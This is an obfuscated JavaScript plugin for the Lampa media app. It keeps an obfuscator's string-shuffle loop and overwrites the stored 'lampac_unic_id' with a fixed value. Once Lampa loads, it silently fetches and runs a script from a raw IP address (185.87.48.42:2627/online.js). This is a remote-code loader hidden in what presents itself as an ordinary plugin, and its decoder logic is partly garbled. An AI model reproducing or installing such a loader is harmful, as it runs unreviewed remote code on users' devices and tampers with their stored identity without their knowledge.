(function() {
    'use strict';

    Lampa.Platform.tv();

    function decodeFunction(offset, base) {
        const charMap = getCharMap();
        return decodeFunction = function(index, shift) {
            index = index - offset;
            const charCode = charMap[index];
            return charCode;
        }, decodeFunction(offset, base);
    }

    (function(initCharMap, magicNumber) {
        const decode = decodeFunction;
        const map = initCharMap();
        while (true) {
            try {
                const result = -parseInt(decode(132, 134)) / 1 * (parseInt(decode(123, 133)) / 2) +
                              -parseInt(decode(127, 134)) / 3 +
                              parseInt(decode(139, 134)) / 4 * (parseInt(decode(142, 134)) / 5) +
                              -parseInt(decode(128, 134)) / 6 +
                              -parseInt(decode(136, 134)) / 7 +
                              -parseInt(decode(155, 134)) / 8 +
                              parseInt(decode(138, 134)) / 9;
                if (result === magicNumber) break;
                else map.push(map.shift());
            } catch (error) {
                map.push(map.shift());
            }
        }
    }(getCharMap, 152924));

    (function() {
        const intervalId = setInterval(() => {
            if (typeof Lampa !== 'undefined') {
                clearInterval(intervalId);

                const storedValue = Lampa.Storage.get('lampac_unic_id', '');
                if (storedValue !== 'tyusdt') {
                    Lampa.Storage.set('lampac_unic_id', 'tyusdt');
                }

                Lampa.Utils.putScriptAsync(['http://185.87.48.42:2627/online.js'], () => {});
            }
        }, 200);
    })();

    function getCharMap() {
        const map = [
            'toString', 'set', 'show', 'Noty', 'Ошибка доступа', 'apply', 'log', 'trace', 'bind', 'constructor',
            'prototype', 'search', 'get', 'Storage', 'Utils', 'Manifest', 'origin', 'bylampa', 'undefined', 'return',
            'function', '287892GtpFmK', 'lampac_unic_id', '1133190oXjfKB', 'tyusdt', 'http://185.87.48.42:2627/online.js'
        ];
        return () => map;
    }
})();
